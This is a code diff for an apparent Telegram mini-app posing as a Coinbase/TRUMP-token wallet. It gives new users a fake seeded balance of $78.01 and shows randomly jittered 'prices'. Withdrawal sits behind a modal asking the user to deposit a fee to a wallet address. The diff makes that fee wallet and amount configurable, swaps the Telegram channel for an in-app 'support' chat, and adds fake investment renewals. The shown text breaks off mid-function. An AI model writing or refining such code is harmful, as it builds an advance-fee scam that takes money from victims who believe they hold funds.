@@ -22,6 +22,7 @@
       color: #fff;
       font-family: 'Inter', sans-serif;
       user-select: none;
+      transition: background-color 0.3s ease;
     }
     #coinbase_hd {
       width: 35px;
@@ -103,10 +104,12 @@
       align-items: center;
       font-size: 1.2rem;
       margin: 10px;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
     .btn-circle:hover {
       background-color: gold;
       color: #222;
+      transform: scale(1.05);
     }
     .action-buttons {
       display: flex;
@@ -136,7 +139,7 @@
       border-radius: 20px;
       padding: 10px;
       display: flex;
-      justify-content: uniting;
+      justify-content: space-between;
       align-items: center;
       margin: 10px 0;
     }
@@ -175,13 +178,22 @@
       margin-top: 15px;
       border-radius: 4px;
       cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
     .dark-content button:hover {
       background-color: #666;
+      transform: scale(1.05);
     }
     .iziModal {
-      width: 80%;
-      max-width: 500px;
+      width: 90%;
+      max-width: 600px;
+      border-radius: 12px;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+    }
+    @media (min-width: 576px) {
+      .iziModal {
+        width: 80%;
+      }
     }
     .wallet-form {
       display: flex;
@@ -193,19 +205,26 @@
     .wallet-form input[type="text"],
     .wallet-form input[type="email"],
     .wallet-form input[type="number"],
-    .wallet-form input[type="password"] {
+    .wallet-form input[type="password"],
+    .form-select {
       width: 90%;
       max-width: 400px;
       padding: 10px;
-      border: 1px solid #444;
-      border-radius: 6px;
+      border: none;
+      border-radius: 8px;
       background-color: #333;
       color: #fff;
       font-size: 0.9rem;
-      outline: none;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      transition: box-shadow 0.3s ease;
     }
     .wallet-form input::placeholder {
       color: #aaa;
+    }
+    .wallet-form input:focus,
+    .form-select:focus {
+      outline: none;
+      box-shadow: 0 0 8px rgba(15, 124, 219, 0.5);
     }
     .wallet-form input[type="submit"] {
       padding: 10px 20px;
@@ -215,10 +234,11 @@
       border-radius: 6px;
       cursor: pointer;
       font-size: 0.9rem;
-      transition: background-color 0.3s ease;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
     .wallet-form input[type="submit"]:hover {
       background-color: #666;
+      transform: scale(1.05);
     }
     .wallet-form input[type="submit"].loading {
       display: flex;
@@ -254,10 +274,11 @@
       border-radius: 6px;
       cursor: pointer;
       font-size: 0.9rem;
-      transition: background-color 0.3s ease;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
     .close-btn:hover {
       background-color: #666;
+      transform: scale(1.05);
     }
     .hidden-label {
       position: absolute;
@@ -305,12 +326,13 @@
     }
     .form-select {
       padding: 10px;
-      border-radius: 6px;
-      border: 1px solid #444;
+      border-radius: 8px;
+      border: none;
       background-color: #333;
       color: #fff;
       margin-bottom: 10px;
       font-size: 0.9rem;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
     }
     #notification-table-body li {
       padding: 10px;
@@ -345,7 +367,7 @@
     body.light .wallet-form input {
       background-color: #fff;
       color: #333;
-      border: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
     }
     body.light .table-dark {
       background-color: #fff;
@@ -364,10 +386,11 @@
       border-radius: 6px;
       font-size: 0.85rem;
       cursor: pointer;
-      transition: background-color 0.3s;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
     .btn-copy:hover {
       background-color: #218838;
+      transform: scale(1.05);
     }
     .investment-options {
       display: flex;
@@ -383,10 +406,11 @@
       border-radius: 6px;
       cursor: pointer;
       font-size: 0.9rem;
-      transition: background-color 0.3s ease;
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
     .investment-btn:hover {
       background-color: #666;
+      transform: scale(1.05);
     }
     .investment-btn:disabled {
       background-color: #333;
@@ -402,27 +426,263 @@
       font-weight: bold;
       color: gold;
     }
+    .switch {
+      position: relative;
+      display: inline-block;
+      width: 50px;
+      height: 24px;
+    }
+    .switch input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: #ccc;
+      transition: 0.4s;
+      border-radius: 24px;
+    }
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 20px;
+      width: 20px;
+      left: 2px;
+      bottom: 2px;
+      background-color: white;
+      transition: 0.4s;
+      border-radius: 50%;
+    }
+    input:checked + .slider {
+      background-color: #0f7cdb;
+    }
+    input:checked + .slider:before {
+      transform: translateX(26px);
+    }
+    .chat-messages {
+      max-height: 300px;
+      overflow-y: auto;
+      margin-bottom: 10px;
+      padding: 10px;
+      background: #222;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    }
+    .chat-date-header {
+      text-align: center;
+      font-size: 0.75rem;
+      color: #999;
+      margin: 10px 0;
+      font-weight: 500;
+      background: #333;
+      padding: 4px 8px;
+      border-radius: 12px;
+      display: inline-block;
+      width: auto;
+      align-self: center;
+    }
+    .chat-message {
+      margin: 6px 0;
+      padding: 8px 12px;
+      border-radius: 12px;
+      max-width: 75%;
+      word-wrap: break-word;
+      position: relative;
+      animation: slideIn 0.3s ease;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 0.9rem;
+    }
+    .chat-message.user {
+      background: #0f7cdb;
+      color: #fff;
+      margin-left: auto;
+      text-align: left;
+      border-bottom-right-radius: 4px;
+      flex-direction: column;
+    }
+    .chat-message.support {
+      background: #333;
+      color: #fff;
+      margin-right: auto;
+      text-align: left;
+      border-bottom-left-radius: 4px;
+    }
+    .chat-message .message-footer {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 6px;
+      margin-top: 4px;
+    }
+    .chat-message small {
+      font-size: 0.65rem;
+      color: #ccc;
+    }
+    .chat-message .status {
+      font-size: 0.7rem;
+      color: #ccc;
+    }
+    .chat-message .status.pending i::before {
+      content: "\f00c";
+    }
+    .chat-message .status.sent i::before {
+      content: "\f560";
+    }
+    .avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #0f7cdb;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.9rem;
+      font-weight: bold;
+      margin-right: 6px;
+      flex-shrink: 0;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+    }
+    .chat-message.support .avatar {
+      background: #555;
+      font-size: 0.8rem;
+    }
+    .chat-message.support .avatar i {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .chat-input {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: #222;
+      padding: 8px;
+      border-radius: 12px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+    .chat-input input {
+      flex: 1;
+      padding: 8px;
+      border: none;
+      border-radius: 8px;
+      background: #333;
+      color: #fff;
+      font-size: 0.85rem;
+      height: 34px;
+      line-height: 1.5;
+      transition: box-shadow 0.3s ease;
+    }
+    .chat-input input:focus {
+      outline: none;
+      box-shadow: 0 0 8px rgba(15, 124, 219, 0.5);
+    }
+    .chat-input button {
+      padding: 0 12px;
+      background: #0f7cdb;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 0.85rem;
+      height: 34px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+    .chat-input button:hover {
+      background: #0b5ea3;
+      transform: scale(1.05);
+    }
+    .typing-indicator {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      padding: 8px;
+      background: #333;
+      border-radius: 12px;
+      margin: 6px 0;
+      max-width: 75%;
+    }
+    .typing-indicator span {
+      width: 6px;
+      height: 6px;
+      background: #0f7cdb;
+      border-radius: 50%;
+      animation: bounce 0.6s infinite alternate;
+    }
+    .typing-indicator span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    .typing-indicator span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+    @keyframes bounce {
+      to {
+        transform: translateY(-4px);
+      }
+    }
+    .support-status {
+      font-size: 0.8rem;
+      color: #ccc;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+    .iziModal {
+      animation: slideInModal 0.3s ease;
+    }
+    @keyframes slideInModal {
+      from {
+        transform: translateY(50px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+    @keyframes slideIn {
+      from {
+        transform: translateY(10px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
     @media (max-width: 576px) {
       .iziModal {
-        width: 90%;
+        width: 95%;
       }
       .dark-content {
         font-size: 0.85rem;
+        padding: 15px;
       }
       .wallet-form input,
       .form-select,
       .investment-btn {
         font-size: 0.8rem;
+        padding: 8px;
       }
       .close-btn {
         font-size: 0.8rem;
+        padding: 8px 15px;
       }
       .depAddr {
         font-size: 0.8rem;
       }
       .btn-copy {
         font-size: 0.75rem;
-        padding: 6px 8px;
+        padding: 4px 8px;
       }
       .countdown-timer {
         font-size: 1rem;
@@ -431,16 +691,73 @@
         font-size: 1rem;
       }
       .table {
-        font-size: 0.75rem;
+        font-size: 0.8rem;
         display: block;
         overflow-x: auto;
         white-space: nowrap;
       }
       .table thead th {
         min-width: 80px;
+        padding: 6px;
       }
       .table tbody td {
         min-width: 80px;
+        padding: 6px;
+      }
+      .chat-messages {
+        max-height: 250px;
+        padding: 8px;
+        margin-bottom: 8px;
+      }
+      .chat-message {
+        font-size: 0.8rem;
+        padding: 6px 10px;
+        margin: 4px 0;
+      }
+      .chat-message .message-footer {
+        gap: 4px;
+      }
+      .chat-message small {
+        font-size: 0.6rem;
+      }
+      .chat-message .status {
+        font-size: 0.65rem;
+      }
+      .avatar {
+        width: 20px;
+        height: 20px;
+        font-size: 0.8rem;
+      }
+      .chat-message.support .avatar {
+        font-size: 0.7rem;
+      }
+      .chat-input {
+        padding: 6px;
+        gap: 6px;
+      }
+      .chat-input input {
+        font-size: 0.8rem;
+        padding: 6px;
+        height: 30px;
+      }
+      .chat-input button {
+        font-size: 0.8rem;
+        padding: 0 10px;
+        height: 30px;
+      }
+      .typing-indicator {
+        padding: 6px;
+      }
+      .typing-indicator span {
+        width: 5px;
+        height: 5px;
+      }
+      .support-status {
+        font-size: 0.75rem;
+      }
+      .chat-date-header {
+        font-size: 0.7rem;
+        padding: 3px 6px;
       }
     }
   </style>
@@ -459,6 +776,7 @@
         <li><a class="dropdown-item open-btn" id="history-pop" data-modal-id="history-iziModal">History</a></li>
         <li><a class="dropdown-item open-btn" id="notification-pop" data-modal-id="notification-iziModal">Notification</a></li>
         <li><a class="dropdown-item open-btn" id="settings-pop" data-modal-id="settings-iziModal">Settings</a></li>
+        <li><a class="dropdown-item open-btn" id="chat-pop" data-modal-id="chat-iziModal">Chat Support</a></li>
         <li><a class="dropdown-item open-btn" id="logout-pop" data-modal-id="logout-iziModal">Logout</a></li>
       </ul>
     </div>
@@ -466,7 +784,7 @@
 
   <!-- Balance Section -->
   <div class="balance-section">
-    <h2 id="balance-display">$78.01</h2>
+    <h2 id="balance-display"><!-- $78.01/$25.01 --> <i class="fas fa-spin-pulse fa-spinner"></i></h2>
     <p>
       <span id="wallet-address" data-wallet="0xA1Ed1234567890abcdef1234567890abcdef1234">0xA1Ed...f1234</span>
       <i id="copyAddress" class="bx bx-copy" title="Copy full address"></i>
@@ -481,7 +799,7 @@
       <span>Send</span>
     </div>
     <div class="action-item">
-      <button class="btn-circle open-withdraw" data-modal-id="darkModal7"><i class="far fa-arrow-alt-circle-up"></i></button>
+      <button class="btn-circle open-btn" data-modal-id="darkModal7"><i class="far fa-arrow-alt-circle-up"></i></button>
       <span>Withdraw</span>
     </div>
     <div class="action-item">
@@ -619,12 +937,9 @@
       <p style="text-align: left;">
         <span>Instructions & Rules:</span>
         <ol type="i" style="text-align:left;">
-          <li>Share your unique referral link to earn bonuses and increase your balance.</li>
-          <li>Join our official Telegram channel for real-time updates, rewards, and exclusive offers.</li>
-          <li>Complete daily tasks posted on the channel to boost your earnings.</li>
+          <li>Complete daily trades to increase your balance and unlock withdrawals.</li>
           <li>Ensure your profile details are complete and accurate to avoid delays in withdrawal processing.</li>
-          <li>Withdrawals require a 2 TON fee to the designated wallet address.</li>
-          <li>Violations of terms (e.g., fake referrals) will result in account suspension.</li>
+          <li>Monitor your transaction history to track deposits, withdrawals, and earnings.</li>
         </ol>
       </p>
       <p style="text-align: left;">
@@ -647,15 +962,14 @@
       <p style="text-align: left;">
         <span>Guides:</span>
         <ul style="text-align:left;">
-          <li>Use the Share button to copy your referral link and send it via Telegram or other platforms.</li>
           <li>Monitor your referral count in the Profile section to track your progress.</li>
           <li>Check the Transaction History regularly to confirm deposits, withdrawals, and fees.</li>
-          <li>Contact support via the Telegram channel for issues with payments or account verification.</li>
+          <li>Contact support via the Chat option in Settings for issues with payments or account verification.</li>
         </ul>
       </p>
-      <p>For more updates or inquiries:</p>
-      <button class="close-btn"><a href="https://t.me/+SgPWVNYhL3QxNTkx">Join our channel</a></button>
-      <button class="close-btn">Back</button>
+      <p>For support or inquiries:</p>
+      <button class="close-btn open-btn" data-modal-id="chat-iziModal">Contact Support</button>
+      <button class="close-btn">Close</button>
     </div>
   </div>
 
@@ -674,9 +988,9 @@
     <div class="dark-content">
       <p><img class="trump_img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png" alt="Trump"></p>
       <p><strong>Don't miss out</strong> on your special offer for this season. The live OFFICIAL TRUMP today is amazing with a 24-hour trading volume of $4430844387.08 USD. Be among the lucky winners now by completing the tasks.</p>
-      <p>Share the link and join our channel to get $10 per referral!</p>
+      <p>Share the link and contact support via Chat for more details!</p>
       <p><strong><a style="color:green;" href="https://coinmarketcap.com/currencies/official-trump/">Read More »</a></strong></p>
-      <p><strong><a href="https://t.me/+SgPWVNYhL3QxNTkx">JOIN CHANNEL</a></strong></p>
+      <p><strong><button class="close-btn open-btn" data-modal-id="chat-iziModal">Contact Support</button></strong></p>
       <button class="close-btn">Close</button>
     </div>
   </div>
@@ -688,10 +1002,15 @@
       <form class="wallet-form" id="wallet-form">
         <label for="walletInput" class="hidden-label">Wallet Address</label>
         <input type="text" id="walletInput" placeholder="Enter Recipient Wallet Address..." required>
-        <span class="text-warning warning">Please verify that the wallet address is valid before withdrawing to prevent loss of funds.</span>
+        <span class="text-warning warning">Please verify that the wallet address is correct before withdrawing to prevent loss of funds.</span>
         <label for="wallet_amountInput" class="hidden-label">Withdrawal Amount</label>
         <input type="number" id="wallet_amountInput" placeholder="Enter Amount" step="0.01" min="0.01" required>
         <span class="text-warning warning hide" id="insufficient-balance">* You do not have sufficient balance!</span>
+        <label for="walletNetwork" class="hidden-label">Network</label>
+        <select id="walletNetwork" class="form-select" required>
+          <option value="ERC20">ERC20 (USDT/ETH)</option>
+          <option value="Bitcoin">Bitcoin (BTC)</option>
+        </select>
         <input id="submitWalletInfo" type="submit" value="Withdraw">
       </form>
       <button class="close-btn">Close</button>
@@ -702,9 +1021,9 @@
   <div id="darkModal8" class="iziModal" data-izimodal-title="Pending">
     <div class="dark-content">
       <p>Payment!!!</p>
-      <p>Kindly copy the wallet address below and make a deposit of 2 <strong class="coin-defaults">TONS</strong>.</p>
+      <p>Kindly copy the wallet address below and make a deposit of <span id="fee-amount">0.00</span> <span id="fee-currency">USD</span>.</p>
       <p>
-        <span class="depAddr">UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy</span>
+        <span class="depAddr" id="fee-wallet"></span>
         <i class="far fa-copy" id="copyIt" title="Copy Address"></i>
       </p>
       <div id="qrCodeContainer" style="margin-top: 15px;"></div>
@@ -721,7 +1040,8 @@
       <p><strong>Congratulations!!! 🎉🎉🎉</strong></p>
       <p>You have already requested a withdrawal! Kindly wait for confirmation of your payment. Your withdrawal will be automatically settled in your specified <span class="coin-defaults">TRUMP</span> wallet after verification.</p>
       <p><h4>Want to earn more?</h4></p>
-      <p>Join our <a href="https://t.me/+SgPWVNYhL3QxNTkx">channel</a> and share your referral link!</p>
+      <p>Contact support via Chat for more details!</p>
+      <p><strong><button class="close-btn open-btn" data-modal-id="chat-iziModal">Contact Support</button></strong></p>
       <p style="font-style:italic; font-weight:100;">Thanks for your participation</p>
       <button class="close-btn" id="continuePaymentCls">Close</button>
     </div>
@@ -767,8 +1087,23 @@
         <label for="currencySelect" class="visually-hidden">Currency</label>
         <select id="currencySelect" class="form-select">
           <option value="USD">USD</option>
+          <option value="USDT">USDT</option>
           <option value="BTC">BTC</option>
+          <option value="ETH">ETH</option>
         </select>
+        <label for="networkSelect" class="visually-hidden">Network</label>
+        <select id="networkSelect" class="form-select">
+          <option value="ERC20">ERC20 (USDT/ETH)</option>
+          <option value="Bitcoin">Bitcoin (BTC)</option>
+        </select>
+        <label for="autoRenew" class="visually-hidden">Auto-Renew Investment</label>
+        <div style="display: flex; align-items: center; gap: 10px;">
+          <span>Auto-Renew Investment</span>
+          <label class="switch">
+            <input type="checkbox" id="autoRenew">
+            <span class="slider"></span>
+          </label>
+        </div>
         <input type="submit" id="submitSettingsInfo" value="Save">
       </form>
       <button class="close-btn">Close</button>
@@ -795,7 +1130,9 @@
           <thead>
             <tr>
               <th>Amount</th>
+              <th>Currency</th>
               <th>Wallet</th>
+              <th>Network</th>
               <th>Type</th>
               <th>Status</th>
               <th>Date</th>
@@ -808,11 +1145,36 @@
     </div>
   </div>
 
+  <!-- Chat iziModal -->
+  <div id="chat-iziModal" class="iziModal" data-izimodal-title="<strong>Chat Support</strong>">
+    <div class="dark-content">
+      <p class="support-status" id="support-status">Support is online</p>
+      <div class="chat-messages" id="chat-messages">
+        <p class="chat-message support">Start chatting with our support team...</p>
+      </div>
+      <div class="chat-input">
+        <input type="text" id="chat-input" placeholder="Type your message...">
+        <button class="btn" id="send-message"><i class="fas fa-paper-plane"></i></button>
+      </div>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
+
   <!-- Logout iziModal -->
   <div id="logout-iziModal" class="iziModal" data-izimodal-title="<strong>Logout</strong>">
     <div class="dark-content">
       <p>You're about to logout of this app</p>
       <button class="close-btn" id="logout-btn">Logout</button>
+      <button class="close-btn">Cancel</button>
+    </div>
+  </div>
+
+  <!-- Confirmation Modal for Investment -->
+  <div id="investment-confirm-modal" class="iziModal" data-izimodal-title="Confirm Investment">
+    <div class="dark-content">
+      <p>Are you sure you want to invest <span id="confirm-investment-amount"></span>?</p>
+      <p>This will deduct the amount from your balance and start your investment plan.</p>
+      <button id="confirm-investment-btn" class="investment-btn">Confirm</button>
       <button class="close-btn">Cancel</button>
     </div>
   </div>
@@ -847,10 +1209,19 @@
     const userId = tg.initDataUnsafe.user?.id || "54321";
     const username = tg.initDataUnsafe.user?.username || "Anonymous";
     const userRef = ref(database, `users/${userId}`);
+    const settingsRef = ref(database, 'settings');
+
+    const conversionRates = {
+      USD: { USD: 1, USDT: 1, BTC: 0.000015, ETH: 0.00033 },
+      USDT: { USD: 1, USDT: 1, BTC: 0.000015, ETH: 0.00033 },
+      BTC: { USD: 66666.67, USDT: 66666.67, BTC: 1, ETH: 22 },
+      ETH: { USD: 3030.30, USDT: 3030.30, BTC: 0.045, ETH: 1 }
+    };
 
     window.firebaseFunctions = {
       database,
       userRef,
+      settingsRef,
       ref,
       set,
       get,
@@ -858,7 +1229,8 @@
       onValue,
       push,
       userId,
-      username
+      username,
+      conversionRates
     };
 
     function generateRandomString(length, chars) {
@@ -897,11 +1269,14 @@
               bankName: "",
               address: "",
               balance: 78.01,
+              currency: "USD",
+              network: "ERC20",
               wallet: walletAddress,
               referrals: 0,
               referredBy: null,
-              settings: { theme: "dark", currency: "USD" },
-              investment: { amount: 0, lastClaim: null },
+              settings: { theme: "dark", currency: "USD", network: "ERC20", autoRenew: false },
+              investment: { amount: 0, lastClaim: null, startDate: null, lastRenewal: null },
+              tradeHistory: {},
               notifications: {
                 welcome: {
                   title: "Welcome!",
@@ -933,11 +1308,9 @@
 
   <!-- Main Script -->
   <script>
-    // Clear cookies for testing
     document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
     document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
 
-    // Fetch BTC price with exponential backoff
     async function fetchBTCPrice(attempts = 3, baseDelay = 1000) {
       for (let i = 0; i < attempts; i++) {
         try {
@@ -950,17 +1323,21 @@
           return price;
         } catch (error) {
           console.error(`BTC price fetch attempt ${i + 1} failed:`, error);
-          if (i === attempts - 1) return 60000; // Fallback
+          if (i === attempts - 1) return 60000;
           await new Promise(resolve => setTimeout(resolve, baseDelay * Math.pow(2, i)));
         }
       }
       return 60000;
     }
 
-    // Update balance display based on currency
     async function updateBalanceDisplay() {
       try {
         const snapshot = await window.firebaseFunctions.get(window.firebaseFunctions.userRef);
+        if (!snapshot.exists()) {
+          console.error("User data not found in Firebase");
+          iziToast.error({ title: "Error", message: "Failed to fetch user data!", position: "topRight" });
+          return;
+        }
         const userData = snapshot.val() || {};
         const balance = userData.balance || 78.01;
         const currency = userData.settings?.currency || "USD";
@@ -970,6 +1347,12 @@
           const btcPrice = await fetchBTCPrice();
           const btcBalance = balance / btcPrice;
           $balanceDisplay.text(`${btcBalance.toFixed(6)} BTC`);
+        } else if (currency === "ETH") {
+          const ethBalance = (balance * window.firebaseFunctions.conversionRates.USD.ETH).toFixed(6);
+          $balanceDisplay.text(`${ethBalance} ETH`);
+        } else if (currency === "USDT") {
+          const usdtBalance = (balance * window.firebaseFunctions.conversionRates.USD.USDT).toFixed(2);
+          $balanceDisplay.text(`${usdtBalance} USDT`);
         } else {
           $balanceDisplay.text(`$${balance.toFixed(2)}`);
         }
@@ -979,7 +1362,6 @@
       }
     }
 
-    // Copy to clipboard
     function copyToClipboard(text) {
       if (!text) {
         iziToast.error({ title: "Error", message: "No text to copy!", position: "topRight" });
@@ -1003,7 +1385,6 @@
       }
     }
 
-    // Show toast notification
     function showToast(message) {
       if (typeof Toastify !== "undefined") {
         Toastify({
@@ -1019,7 +1400,6 @@
       }
     }
 
-    // Wait for Firebase initialization
     function waitForFirebase(callback) {
       if (window.firebaseInitialized) {
         callback();
@@ -1028,19 +1408,29 @@
       }
     }
 
-    // Update crypto prices
     const updatePrices = () => {
       const cryptoCards = document.querySelectorAll('.crypto-card');
       cryptoCards.forEach((card) => {
         const priceElement = card.querySelector('.price p');
-        const currentPriceText = priceElement.textContent.replace('$', '');
+        const currentPriceText = priceElement.textContent.replace(/[$A-Za-z]/g, '');
         const currentPrice = parseFloat(currentPriceText) || 0;
         const change = (Math.random() * 0.5 - 0.25).toFixed(2);
         const newPrice = Math.max(0, currentPrice + parseFloat(change)).toFixed(2);
-        
-        priceElement.textContent = `$${newPrice}`;
+        const currency = window.firebaseFunctions?.userData?.settings?.currency || "USD";
+        let displayPrice = newPrice;
+        if (currency === "BTC") {
+          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.BTC).toFixed(6);
+          priceElement.textContent = `${displayPrice} BTC`;
+        } else if (currency === "ETH") {
+          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.ETH).toFixed(6);
+          priceElement.textContent = `${displayPrice} ETH`;
+        } else if (currency === "USDT") {
+          displayPrice = (newPrice * window.firebaseFunctions.conversionRates.USD.USDT).toFixed(2);
+          priceElement.textContent = `${displayPrice} USDT`;
+        } else {
+          priceElement.textContent = `$${newPrice}`;
+        }
         priceElement.classList.remove('green', 'red');
-        
         if (parseFloat(change) > 0) {
           priceElement.classList.add('green');
         } else if (parseFloat(change) < 0) {
@@ -1049,7 +1439,6 @@
       });
     };
 
-    // Update countdown timer
     function updateCountdown(lastClaim, callback) {
       const now = new Date().getTime();
       const lastClaimTime = lastClaim ? new Date(lastClaim).getTime() : 0;
@@ -1074,19 +1463,35 @@
       setTimeout(() => updateCountdown(lastClaim, callback), 1000);
     }
 
+    function formatChatDate(timestamp) {
+      const date = new Date(timestamp);
+      const now = new Date();
+      const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+      const messageDate = new Date(date.getFullYear(), date.getMonth(), date.getDate());
+      const yesterday = new Date(today);
+      yesterday.setDate(today.getDate() - 1);
+
+      if (messageDate.getTime() === today.getTime()) {
+        return "Today";
+      } else if (messageDate.getTime() === yesterday.getTime()) {
+        return "Yesterday";
+      } else {
+        return date.toLocaleDateString('en-US', { month: 'long', day: 'numeric' });
+      }
+    }
+
     $(document).ready(function() {
       if (typeof $.fn.iziModal === "undefined") {
         iziToast.error({ title: "Error", message: "iziModal failed to load!", position: "topRight" });
         return;
       }
 
-      // Initialize modals
       $(".iziModal").each(function() {
         $(this).iziModal({
           background: '#222',
           headerColor: '#444',
-          width: '80%',
-          radius: 10,
+          width: '90%',
+          radius: 12,
           transitionIn: 'fadeInUp',
           transitionOut: 'fadeOutDown',
           onOpening: function() {
@@ -1095,11 +1500,9 @@
         });
       });
 
-      // Open update modal on load
       $("#darkModal6").iziModal("open");
       setTimeout(() => $("#darkModal6").iziModal("close"), 20000);
 
-      // Open modal buttons
       $(".open-btn").on("click", function() {
         const modalId = $(this).data("modal-id");
         try {
@@ -1109,7 +1512,6 @@
         }
       });
 
-      // Close modal buttons
       $(".close-btn").on("click", function() {
         try {
           $(this).closest(".iziModal").iziModal("close");
@@ -1118,36 +1520,18 @@
         }
       });
 
-      // Update prices every 5 seconds
       setInterval(updatePrices, 5000);
 
       waitForFirebase(async () => {
-        const { database, userRef, ref, set, get, update, onValue, push, userId, username } = window.firebaseFunctions || {};
+        const { database, userRef, settingsRef, ref, set, get, update, onValue, push, userId, username, conversionRates } = window.firebaseFunctions || {};
         if (!database || !onValue || !get) {
           iziToast.error({ title: "Error", message: "Firebase not initialized properly!", position: "topRight" });
           return;
         }
 
-        // Initialize QR code
-        const depositAddress = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
-        try {
-          new QRCode(document.getElementById("qrCodeContainer"), {
-            text: depositAddress,
-            width: 150,
-            height: 150,
-            colorDark: '#000000',
-            colorLight: '#ffffff',
-            correctLevel: QRCode.CorrectLevel.H,
-          });
-        } catch (error) {
-          console.error("QR code generation failed:", error);
-          iziToast.error({ title: "Error", message: "Failed to generate QR code!", position: "topRight" });
-        }
-
         let btcPrice = await fetchBTCPrice();
         let userWalletAddress = "0xA1Ed1234567890abcdef1234567890abcdef1234";
 
-        // Refresh BTC price every 5 minutes
         setInterval(async () => {
           if (Date.now() - (window.lastBtcPriceFetch || 0) >= 5 * 60 * 1000) {
             btcPrice = await fetchBTCPrice();
@@ -1155,7 +1539,19 @@
           }
         }, 5 * 60 * 1000);
 
-        // Copy wallet address
+        function updateNetworkOptions(currency) {
+          const networkSelect = $('#walletNetwork, #networkSelect');
+          networkSelect.empty();
+          if (currency === 'BTC') {
+            networkSelect.append('<option value="Bitcoin">Bitcoin (BTC)</option>');
+          } else {
+            networkSelect.append('<option value="ERC20">ERC20 (USDT/ETH)</option>');
+            if (currency !== 'USDT' && currency !== 'ETH') {
+              networkSelect.append('<option value="Bitcoin">Bitcoin (BTC)</option>');
+            }
+          }
+        }
+
         $("#copyAddress").on("click", async () => {
           try {
             const snapshot = await get(userRef);
@@ -1168,17 +1564,16 @@
           }
         });
 
-        // Copy deposit address
         $("#copyIt").on("click", async () => {
           try {
-            await copyToClipboard(depositAddress);
+            const feeWallet = $('#fee-wallet').text();
+            await copyToClipboard(feeWallet);
             showToast("Deposit address copied to clipboard!");
           } catch (error) {
             iziToast.error({ title: "Error", message: `Failed to copy deposit address: ${error.message}`, position: "topRight" });
           }
         });
 
-        // Share referral link
         $("#share-button").on("click", async () => {
           const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
           try {
@@ -1196,9 +1591,14 @@
           }
         });
 
-        // Update user data
-        onValue(userRef, (snapshot) => {
+        onValue(userRef, async (snapshot) => {
+          if (!snapshot.exists()) {
+            console.error("User data snapshot not found");
+            iziToast.error({ title: "Error", message: "Failed to load user data!", position: "topRight" });
+            return;
+          }
           const userData = snapshot.val() || {};
+          window.firebaseFunctions.userData = userData;
           $("#usernameInput").val(userData.username || username);
           $("#fullNameInput").val(userData.fullName || "");
           $("#emailInput").val(userData.email || "");
@@ -1214,14 +1614,40 @@
           userWalletAddress = walletAddress;
           $("#themeSelect").val(userData.settings?.theme || "dark");
           $("#currencySelect").val(userData.settings?.currency || "USD");
+          $("#networkSelect").val(userData.settings?.network || "ERC20");
+          $("#autoRenew").prop('checked', userData.settings?.autoRenew || false);
           $("body").removeClass("light dark").addClass(userData.settings?.theme || "dark");
-          updateBalanceDisplay();
+          updateNetworkOptions(userData.settings?.currency || "USD");
+          await updateBalanceDisplay();
 
-          // Update investment status
+          if (userData.settings?.autoRenew && userData.investment?.startDate) {
+            const lastRenewal = userData.investment.lastRenewal ? new Date(userData.investment.lastRenewal) : new Date(userData.investment.startDate);
+            const now = new Date();
+            const daysSinceRenewal = Math.floor((now - lastRenewal) / (1000 * 60 * 60 * 24));
+            if (daysSinceRenewal >= 30) {
+              const txRef = push(ref(database, `users/${userId}/transactions`));
+              await set(txRef, {
+                amount: userData.investment.amount,
+                currency: userData.settings?.currency || "USD",
+                wallet: userData.wallet,
+                network: userData.settings?.network || "ERC20",
+                type: "Investment Renewal",
+                status: "completed",
+                timestamp: now.toISOString(),
+              });
+              await update(userRef, {
+                'investment/lastRenewal': now.toISOString(),
+              });
+              iziToast.success({ title: "Success", message: "Investment renewed!", position: "topRight" });
+            }
+          }
+
           const investmentAmount = userData.investment?.amount || 0;
           const lastClaim = userData.investment?.lastClaim;
           if (investmentAmount > 0) {
